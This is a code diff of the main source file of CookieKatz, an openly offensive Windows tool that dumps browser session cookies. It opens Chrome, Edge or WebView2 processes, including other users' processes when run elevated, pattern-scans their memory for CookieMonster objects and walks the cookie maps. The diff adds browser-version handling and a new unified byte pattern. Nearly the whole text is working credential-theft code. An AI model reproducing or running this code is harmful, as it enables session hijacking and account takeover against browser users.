@@ -1,54 +1,54 @@
-#include <stdio.h>
 #include <Windows.h>
 #include <shlwapi.h>
 
 #include "Helper.h"
 #include "Process.h"
 #include "Memory.h"
+#include "Version.h"
 
 void banner() { //This is important
-    printf(" _____             _    _      _   __      _       \n");
-    printf("/  __ \\           | |  (_)    | | / /     | |      \n");
-    printf("| /  \\/ ___   ___ | | ___  ___| |/ /  __ _| |_ ____\n");
-    printf("| |    / _ \\ / _ \\| |/ / |/ _ \\    \\ / _` | __|_  /\n");
-    printf("| \\__/\\ (_) | (_) |   <| |  __/ |\\  \\ (_| | |_ / / \n");
-    printf(" \\____/\\___/ \\___/|_|\\_\\_|\\___\\_| \\_/\\__,_|\\__/___|\n");
-    printf("By Meckazin                     github.com / Meckazin \n");
+    PRINT(" _____             _    _      _   __      _       \n");
+    PRINT("/  __ \\           | |  (_)    | | / /     | |      \n");
+    PRINT("| /  \\/ ___   ___ | | ___  ___| |/ /  __ _| |_ ____\n");
+    PRINT("| |    / _ \\ / _ \\| |/ / |/ _ \\    \\ / _` | __|_  /\n");
+    PRINT("| \\__/\\ (_) | (_) |   <| |  __/ |\\  \\ (_| | |_ / / \n");
+    PRINT(" \\____/\\___/ \\___/|_|\\_\\_|\\___\\_| \\_/\\__,_|\\__/___|\n");
+    PRINT("By Meckazin                     github.com / Meckazin \n");
 };
 
 void usage() {
-    printf("Help!\n\n");
-    printf("Examples:\n");
-    printf(".\\CookieKatz.exe\n");
-    printf("    By default targets first available Chrome process\n");
-    printf(".\\CookieKatz.exe /edge\n");
-    printf("    Targets first available Edge process\n");
-    printf(".\\CookieKatz.exe /pid:<pid>\n");
-    printf("    Attempts to target given pid, expecting it to be Chrome\n");
-    printf(".\\CookieKatz.exe /webview /pid:<pid>\n");
-    printf("    Targets the given msedgewebview2 process\n");
-    printf(".\\CookieKatz.exe /list /webview\n");
-    printf("    Lists available webview processes\n");
-    printf("\n");
-    printf("Flags:\n");
-    printf("    /edge       Target current user Edge process\n");
-    printf("    /webview    Target current user Msedgewebview2 process\n");
-    printf("    /pid        Attempt to dump given pid, for example, someone else's if running elevated\n");
-    printf("    /list       List targettable processes, use with /edge or /webview to target other browsers\n");
-    printf("    /help       This what you just did! -h works as well\n");
+    PRINT("Help!\n\n");
+    PRINT("Examples:\n");
+    PRINT(".\\CookieKatz.exe\n");
+    PRINT("    By default targets first available Chrome process\n");
+    PRINT(".\\CookieKatz.exe /edge\n");
+    PRINT("    Targets first available Edge process\n");
+    PRINT(".\\CookieKatz.exe /pid:<pid>\n");
+    PRINT("    Attempts to target given pid, expecting it to be Chrome\n");
+    PRINT(".\\CookieKatz.exe /webview /pid:<pid>\n");
+    PRINT("    Targets the given msedgewebview2 process\n");
+    PRINT(".\\CookieKatz.exe /list /webview\n");
+    PRINT("    Lists available webview processes\n");
+    PRINT("\n");
+    PRINT("Flags:\n");
+    PRINT("    /edge       Target current user Edge process\n");
+    PRINT("    /webview    Target current user Msedgewebview2 process\n");
+    PRINT("    /pid        Attempt to dump given pid, for example, someone else's if running elevated\n");
+    PRINT("    /list       List targettable processes, use with /edge or /webview to target other browsers\n");
+    PRINT("    /help       This what you just did! -h works as well\n");
 }
 
 #pragma comment(lib,"shlwapi.lib")
 int main(int argc, char* argv[]) {
     banner();
-	printf("Kittens love cookies too!\n\n");
+	PRINT("Kittens love cookies too!\n\n");
 
 #ifndef _WIN64
-    printf("[-] 32bit version is not currently supported.\n");
+    PRINT("[-] 32bit version is not currently supported.\n");
     return 1;
 #endif // !_WIN64
 
-    Browser targetBrowser = Chrome;
+    TargetVersion targetConfig = Chrome;
     BOOL ProcessList = FALSE;
     DWORD pid = 0;
 
@@ -62,15 +62,15 @@ int main(int argc, char* argv[]) {
             size_t pidLen = strlen(colonPos + 1);
             char* remainder = new char[pidLen + 1];
             strcpy_s(remainder, pidLen + 1, colonPos + 1);
-            if (sscanf_s(remainder, "%lu", &pid) == 0) {
-                printf("[-] Failed to parse command line argument /pid!");
+            if (SSCAN(remainder, "%lu", &pid) == 0) {
+                PRINT("[-] Failed to parse command line argument /pid!");
                 return 1;
             }
         }
         if (StrStrIA(argv[i], "edge") != NULL)
-            targetBrowser = Msedge;
+            targetConfig = Edge;
         if (StrStrIA(argv[i], "webview") != NULL)
-            targetBrowser = Msedgewebview2;
+            targetConfig = Webview2;
         if (StrStrIA(argv[i], "list") != NULL)
             ProcessList = TRUE;
         if (StrStrIA(argv[i], "help") != NULL || StrStrIA(argv[i], "-h") != NULL) {
@@ -79,174 +79,181 @@ int main(int argc, char* argv[]) {
         }
     }
 
-    HANDLE hChrome = NULL;
+    HANDLE hProcess = NULL;
     //If some PID was given
     if (pid != 0)
     {
-        if (!GetProcessHandle(pid, &hChrome))
+        if (!GetProcessHandle(pid, &hProcess))
         {
-            printf("[-] Failed to get process handle to PID: %lu\n",pid);
+            PRINT("[-] Failed to get process handle to PID: %lu\n",pid);
             return 1;
         }
-        if (!GetProcessName(hChrome, targetBrowser))
+        if (!GetProcessName(hProcess, targetConfig))
         {
-            printf("[-] Failed to get process handle to PID: %lu\n", pid);
+            PRINT("[-] Failed to get process handle to PID: %lu\n", pid);
             return 1;
         }
 
-        if (IsWow64(hChrome))
+        if (IsWow64(hProcess))
         {
-            printf("[-] Target process is 32bit. Only 64bit browsers are supported!\n");
-            CloseHandle(hChrome);
+            PRINT("[-] Target process is 32bit. Only 64bit browsers are supported!\n");
+            CloseHandle(hProcess);
             return 1;
         }
     }
 
-    LPCWSTR processName;
-    LPCWSTR dllName;
-    size_t szPattern = 0;
     //0xAA is a wild card that matches any byte
     //Pattern is the implementation of the function net::CookieMonster::~CookieMonster(void)
     //We use that to find the contents of Virtual Function Pointer struct (__vfptr)
     //Each instance of CookieMonster comes with one
-    szPattern = 144;
-    BYTE* pattern;
-    bool isChrome = true;
-    
-    switch (targetBrowser)
+    LPCWSTR targetProcess = L"\0";
+    LPCWSTR targetDll = L"\0";
+
+    if (targetConfig == Chrome || targetConfig == OldChrome || targetConfig == Chrome124)
     {
-    case Chrome:
-        printf("[*] Targeting Chrome\n");
-        processName = L"chrome.exe";
-        dllName = L"chrome.dll";
-        pattern = new BYTE[144]{
-            0x56, 0x57, 0x48, 0x83, 0xEC, 0x28, 0x89, 0xD7, 0x48, 0x89, 0xCE, 0xE8, 0xAA, 0xAA, 0xFF, 0xFF, 
-            0x85, 0xFF, 0x74, 0x08, 0x48, 0x89, 0xF1, 0xE8, 0xAA, 0xAA, 0xAA, 0xAA, 0x48, 0x89, 0xF0, 0x48, 
-            0x83, 0xC4, 0x28, 0x5F, 0x5E, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 
-            0x56, 0x57, 0x48, 0x83, 0xEC, 0xAA, 0x48, 0x89, 0xAA, 0x48, 0x8B, 0x05, 0xAA, 0xAA, 0xAA, 0xAA, 
-            0x48, 0x31, 0xE0, 0x48, 0x89, 0x44, 0x24, 0x30, 0x48, 0x8D, 0x79, 0xAA, 0xAA, 0xAA, 0xAA, 0x28, 
-            0xE8, 0xAA, 0xAA, 0xAA, 0xF8, 0x48, 0x8B, 0x46, 0x20, 0x48, 0x8B, 0x4E, 0x28, 0x48, 0x8B, 0x96, 
-            0x50, 0x01, 0x00, 0x00, 0x4C, 0x8D, 0x44, 0x24, 0x28, 0x49, 0x89, 0x10, 0x48, 0xC7, 0x86, 0x50, 
-            0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x89, 0xFA, 0xFF, 0x15, 0xAA, 0xAA, 0xAA, 0xAA, 
-            0x48, 0x8B, 0x4C, 0x24, 0x30, 0x48, 0x31, 0xE1, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA
-        };
-        break;
-    case Msedge:
-        printf("[*] Targeting Edge\n");
-        isChrome = false;
-        processName = L"msedge.exe";
-        dllName = L"msedge.dll";
-        pattern = new BYTE[144]{
-            0x56, 0x57, 0x48, 0x83, 0xEC, 0x28, 0x89, 0xD7, 0x48, 0x89, 0xCE, 0xE8, 0xAA, 0xAA, 0xFF, 0xFF,
-            0x85, 0xFF, 0x74, 0x08, 0x48, 0x89, 0xF1, 0xE8, 0xAA, 0xAA, 0xAA, 0xAA, 0x48, 0x89, 0xF0, 0x48,
-            0x83, 0xC4, 0x28, 0x5F, 0x5E, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
-            0x56, 0x57, 0x48, 0x83, 0xEC, 0x38, 0x48, 0x89, 0xCE, 0x48, 0x8B, 0x05, 0xAA, 0xAA, 0xAA, 0xAA,
-            0x48, 0x31, 0xE0, 0x48, 0x89, 0x44, 0x24, 0x30, 0x48, 0x8D, 0x79, 0x30, 0x48, 0x8B, 0x49, 0x28,
-            0xE8, 0xAA, 0xAA, 0xAA, 0xAA, 0x48, 0x8B, 0x46, 0x20, 0x48, 0x8B, 0x4E, 0x28, 0x48, 0x8B, 0x96,
-            0xAA, 0x01, 0x00, 0x00, 0x4C, 0x8D, 0x44, 0x24, 0x28, 0x49, 0x89, 0x10, 0x48, 0xC7, 0x86, 0xAA,
-            0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x89, 0xFA, 0xFF, 0x15, 0xAA, 0xAA, 0xAA, 0xAA,
-            0x48, 0x8B, 0x4C, 0x24, 0x30, 0x48, 0x31, 0xE1, 0xE8, 0xAA, 0xAA, 0xAA, 0xAA, 0x90, 0x48, 0x83
-        };
-        break;
-    case Msedgewebview2:
-        printf("[*] Targeting Msedgewebview2\n");
-        isChrome = false;
-        processName = L"msedgewebview2.exe";
-        dllName = L"msedge.dll";
-        pattern = new BYTE[144]{
-            0x56, 0x57, 0x48, 0x83, 0xEC, 0x28, 0x89, 0xD7, 0x48, 0x89, 0xCE, 0xE8, 0xAA, 0xAA, 0xFF, 0xFF, 
-            0x85, 0xFF, 0x74, 0x08, 0x48, 0x89, 0xF1, 0xE8, 0xAA, 0xAA, 0xAA, 0xFB, 0x48, 0x89, 0xF0, 0x48, 
-            0x83, 0xC4, 0x28, 0x5F, 0x5E, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 
-            0x56, 0x57, 0x48, 0x83, 0xEC, 0x38, 0x48, 0x89, 0xCE, 0x48, 0x8B, 0x05, 0xAA, 0xAA, 0xAA, 0x07, 
-            0x48, 0x31, 0xE0, 0x48, 0x89, 0x44, 0x24, 0x30, 0x48, 0x8D, 0x79, 0x30, 0x48, 0x8B, 0x49, 0x28, 
-            0xE8, 0xAA, 0xAA, 0xAA, 0xF8, 0x48, 0x8B, 0x46, 0x20, 0x48, 0x8B, 0x4E, 0x28, 0x48, 0x8B, 0x96, 
-            0x48, 0x01, 0x00, 0x00, 0x4C, 0x8D, 0x44, 0x24, 0x28, 0x49, 0x89, 0x10, 0x48, 0xC7, 0x86, 0x48, 
-            0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x89, 0xFA, 0xFF, 0x15, 0xAA, 0xAA, 0xAA, 0xAA, 
-            0x48, 0x8B, 0x4C, 0x24, 0x30, 0x48, 0x31, 0xE1, 0xE8, 0xAA, 0xAA, 0xAA, 0xFB, 0x90, 0x48, 0x83
-        };
-        break;
-    default:
-        printf("[-] Invalid target browser!\n");
-        CloseHandle(hChrome);
-        return 1;
-        break;
+        PRINT("[*] Targeting Chrome\n");
+        targetProcess = L"chrome.exe";
+        targetDll = L"chrome.dll";
+    }
+    else if (targetConfig == Edge || targetConfig == OldEdge || targetConfig == Webview2)
+    {
+        if (targetConfig == Webview2) {
+            PRINT("[*] Targeting Webview2\n");
+            targetProcess = L"msedgewebview2.exe";
+            targetDll = L"msedge.dll";
+        }
+        else {
+            PRINT("[*] Targeting Edge\n");
+            targetProcess = L"msedge.exe";
+            targetDll = L"msedge.dll";
+        }
+    }
+    else {
+        PRINT("[-] Unknown config\n");
+        return 0;
     }
 
     if (ProcessList)
     {
-        printf("[*] Listing targetable processes\n");
-        FindAllSuitableProcesses(processName);
-        printf("[+] Done\n");
+        PRINT("[*] Listing targetable processes\n");
+        FindAllSuitableProcesses(targetProcess);
+        PRINT("[+] Done\n");
         return 0;
     }
 
     //If pid was not given, now we go and find the process and handle
     if (pid == 0)
     {
-        if (!FindCorrectProcessPID(processName, &pid, &hChrome) || hChrome == NULL)
+        if (!FindCorrectProcessPID(targetProcess, &pid, &hProcess) || hProcess == NULL)
         {
-            printf("[-] Failed to find right process\n");
+            PRINT("[-] Failed to find right process\n");
             return 1;
         }
 
-        if (IsWow64(hChrome))
+        if (IsWow64(hProcess))
         {
-            printf("[-] Target process is 32bit. Only 64bit browsers are supported!\n");
-            CloseHandle(hChrome);
+            PRINT("[-] Target process is 32bit. Only 64bit browsers are supported!\n");
+            CloseHandle(hProcess);
             return 1;
         }
     }
 #ifdef _DEBUG
-    wprintf(TEXT("[*] Targeting process PID: %d\n"), pid);
+    PRINTW(TEXT("[*] Targeting process PID: %d\n"), pid);
 #endif
 
+    //Versions and configs
+    // 125.0.6388.0 >= Chrome
+    // 125.0.6387.0 <= Chrome124
+    // 124.0.6329.0 >= Chrome124
+    // 124.0.6328.0 <= OldChrome
 
-    uintptr_t baseAddress = 0;
-    DWORD moduleSize = 0;
-    if (!GetRemoteModuleBaseAddress(hChrome, dllName, baseAddress, &moduleSize))
+    //124.0.2478 >= Edge
+    //124.0.2478 < OldEdge
+    //I couldn't test that at what point Edge CanonicalCookie class was updated
+    //So for now Edge doesn't support certain versions
+    //Same goes for msedgewebivew2
+
+    BrowserVersion browserVersion = { 0 };
+    if (!GetBrowserVersion(hProcess, browserVersion)) {
+        PRINT("[-] Failed to determine browser version!");
+        return 0;
+    }
+
+    //Update config based on target version
+    if (targetConfig == Chrome) {
+        if ((browserVersion.highMajor == 125 && browserVersion.highMinor <= 6387) ||
+            (browserVersion.highMajor == 124 && browserVersion.highMinor >= 6329))
+            targetConfig = Chrome124;
+        else if (browserVersion.highMajor <= 124 ||
+            (browserVersion.highMajor == 124 && browserVersion.highMinor < 6329))
+            targetConfig = OldChrome;
+    }
+    else if (targetConfig == Edge || targetConfig == Webview2) {
+        if (browserVersion.highMajor <= 124 ||
+            (browserVersion.highMajor == 124 && browserVersion.highMinor < 2478))
+            targetConfig = OldEdge;
+    }
+
+    //One pattern to rule them all
+    size_t szPattern = 192;
+    BYTE pattern[] = {
+        0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x00, 0x00, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x00, 0x00,
+        0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xAA, 0xAA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+        0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x00, 0x00, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x00, 0x00,
+        0xAA, 0xAA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x00, 0x00,
+        0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x00, 0x00, 0xAA, 0xAA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+        0xAA, 0xAA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+        0xAA, 0xAA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+        0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x00, 0x00, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x00, 0x00,
+        0xAA, 0xAA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x00, 0x00,
+        0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x00, 0x00, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x00, 0x00,
+        0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x00, 0x00, 0xAA, 0xAA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
+    };
+
+    uintptr_t chromeDlladdress = 0;
+    DWORD modulesize = 0;
+    if (!GetRemoteModuleBaseAddress(hProcess, targetDll, chromeDlladdress, &modulesize))
     {
-        printf("[-] Failed to find %ls base address!\n", dllName);
-        CloseHandle(hChrome);
-        return 1;
-    }
-
-    uintptr_t resultAddress = 0;
-    if (!FindDllPattern(hChrome, pattern, szPattern, baseAddress, moduleSize, resultAddress)) {
-        printf("[-] Failed to find the first pattern!\n");
-        CloseHandle(hChrome);
-        return 1;
+        PRINT("[-] Failed to find target DLL\n");
+        CloseHandle(hProcess);
+        return 0;
     }
 
 #ifdef _DEBUG
-    wprintf(TEXT("[*] Found first pattern on 0x%p\n"), (void*)resultAddress);
+    PRINTW(L"[+] Found %ls in address: 0x%p\n", targetDll, (void*)chromeDlladdress);
 #endif
-    BYTE secondPattern[sizeof(uintptr_t)];
-    ConvertToByteArray(resultAddress, secondPattern, sizeof(uintptr_t));
-
-    if (!FindDllPattern(hChrome, secondPattern, sizeof(uintptr_t), baseAddress, moduleSize, resultAddress)) {
-        printf("[-] Failed to find the second pattern!\n");
-        CloseHandle(hChrome);
-        return 1;
+    uintptr_t targetSection = 0;
+    if (!FindLargestSection(hProcess, chromeDlladdress, targetSection)) {
+        PRINT("[-] Something went wrong");
+        CloseHandle(hProcess);
+        return 0;
     }
-#ifdef _DEBUG
-    wprintf(TEXT("[*] Found second pattern on 0x%p\n"), (void*)resultAddress);
-#endif
-    BYTE thirdPattern[sizeof(uintptr_t)];
-    ConvertToByteArray(resultAddress, thirdPattern, sizeof(uintptr_t));
 
-    uintptr_t* CookieMonsterInstances = (uintptr_t*)malloc(sizeof(uintptr_t)*100); //There is no person with computer RAM enough to run more than 100 chrome instances :D
+#ifdef _DEBUG
+    PRINTW(L"[+] Found target region in section: 0x%p\n", (void*)targetSection);
+#endif
+    BYTE chromeDllPattern[sizeof(uintptr_t)];
+    ConvertToByteArray(targetSection, chromeDllPattern, sizeof(uintptr_t));
+
+    //Patch in the base address
+    PatchPattern(pattern, chromeDllPattern, 8);
+    PatchPattern(pattern, chromeDllPattern, 160);
+
+    uintptr_t* CookieMonsterInstances = (uintptr_t*)malloc(sizeof(uintptr_t) * 1000);
     size_t szCookieMonster = 0;
-    if (CookieMonsterInstances == NULL || !FindPattern(hChrome, thirdPattern, sizeof(uintptr_t), CookieMonsterInstances, szCookieMonster)) {
-        printf("[-] Failed to find the third pattern!\n");
-        CloseHandle(hChrome);
+    if (CookieMonsterInstances == NULL || !FindPattern(hProcess, pattern, szPattern, CookieMonsterInstances, szCookieMonster))
+    {
+        PRINT("[-] Failed to find pattern\n");
+        CloseHandle(hProcess);
         free(CookieMonsterInstances);
-        return 1;
+        return 0;
     }
-#ifdef _DEBUG
-    wprintf(TEXT("[*] Found %zu instances of CookieMonster!\n"), szCookieMonster);
 
+    PRINTW(TEXT("[*] Found %Iu instances of CookieMonster!\n"), szCookieMonster);
+#ifdef _DEBUG
     for (size_t i = 0; i < szCookieMonster; i++)
-        wprintf(TEXT("[*] Found CookieMonster on 0x%p\n"), (void*)CookieMonsterInstances[i]);
+        PRINTW(TEXT("[*] Found CookieMonster on 0x%p\n"), (void*)CookieMonsterInstances[i]);
 #endif
 
     //I don't know that the first instance of the CookieMonster is supposed to be, but the CookieMap for it seems to always be empty
@@ -258,14 +265,14 @@ int main(int argc, char* argv[]) {
         uintptr_t CookieMapOffset = 0x28; //This offset is fixed since the data just is there like it is
         CookieMapOffset += CookieMonsterInstances[i] + sizeof(uintptr_t); //Include the length of the result address as well
 #ifdef _DEBUG
-        wprintf(TEXT("[*] CookieMap should be found in address 0x%p\n"), (void*)CookieMapOffset);
+        PRINTW(TEXT("[*] CookieMap should be found in address 0x%p\n"), (void*)CookieMapOffset);
 #endif
-        WalkCookieMap(hChrome, CookieMapOffset, isChrome);
+        WalkCookieMap(hProcess, CookieMapOffset, targetConfig);
     }
 
-    CloseHandle(hChrome);
+    CloseHandle(hProcess);
     free(CookieMonsterInstances);
 
-    printf("[+] Done\n");
+    PRINT("[+] Done\n");
     return 0;
 }
